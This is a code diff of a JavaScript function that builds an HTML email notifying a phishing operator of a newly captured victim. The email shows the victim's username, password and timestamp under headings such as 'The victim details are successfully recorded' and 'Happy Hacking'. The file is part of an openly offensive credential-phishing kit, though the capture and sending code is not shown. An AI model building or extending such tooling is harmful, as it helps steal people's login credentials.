@@ -3,61 +3,80 @@ const createPAssTemplate = (data) => {
     const date = new Date(createdAt);
     const finalDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`
     return  `
-    <!DOCTYPE html>
-    <html lang="en">
-      <head>
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
         <meta charset="UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Email Confirmation</title>
+        <title>Welcome Email</title>
         <style>
-          /* CSS styles for the email template */
-          body {
+            /* Reset some default styles */
+            body {
+            margin: 0;
+            padding: 0;
             font-family: Arial, sans-serif;
-          }
-          .container {
+            line-height: 1.5;
+            color: #008722;
+            background-color: #969696;
+            }
+            h1, p {
+            margin: 0;
+            }
+            /* Container styles */
+            .container {
             max-width: 600px;
             margin: 0 auto;
             padding: 20px;
-          }
-          .header {
-            background-color: #f0f0f0;
-            padding: 10px;
+            }
+            /* Header styles */
+            .header {
+            background-color: #000000;
+            padding: 20px;
             text-align: center;
-          }
-          .content {
-            margin-top: 20px;
-          }
-          .info {
+            }
+            .header h1 {
+            color: #333333;
             margin-bottom: 10px;
-          }
-          .footer {
-            margin-top: 20px;
+            }
+            /* Content styles */
+            .content {
+            padding: 20px;
+            background-color: #000000;
+            border-radius: 4px;
+            }
+            .content p {
+            margin-bottom: 20px;
+            }
+            /* Footer styles */
+            .footer {
+            
+            }
+            .marquee{
+            padding: 30px;
+            color: #008722;
+            background-color: #000000;
+            padding: 20px;
             text-align: center;
-            font-size: 12px;
-            color: #888888;
-          }
+            }
         </style>
-      </head>
-      <body>
+        </head>
+        <body>
         <div class="container">
-          <div class="header">
-            <h2>Machli phasi phishing sai</h2>
-          </div>
-          <div class="content">
-            <p>Dear Satyamii pro, hacker, coder, worrior, programer, developer, tester, teacher, gamer, ethlit </p>
-            <p>Ek banda phasa <b>${finalDate}</b> time pai</p>
-            <ul class="info">
-              <li>Username: ${username}</li>
-              <li>Password: ${pass}</li>
-            </ul>
-          </div>
-          <div class="footer">
-            <p>This is an automated email. Please do not reply.</p>
-          </div>
-        </div>
-      </body>
-    </html>
+            <div class="header">
+            <h2>Welcome To Data Ocean</h2>
+            </div>
+            <div class="content">
+            <p>Hello Fisher,</p>
+            <p><b>The victim details are successfully recorded...</b></p>
+            <p><strong>Username:</strong> ${username}</p>
+            <p><strong>Password:</strong> ${pass}</p>
+            <p><strong>Time:</strong> ${finalDate}</p>
+            </div>
+            <div class="marquee">
+            <marquee scrollamount="10" direction="right">Happy Hacking By Satyamiiiii</marquee>
+            </div>
+         </body>
+        </html>
     `;
   }
   
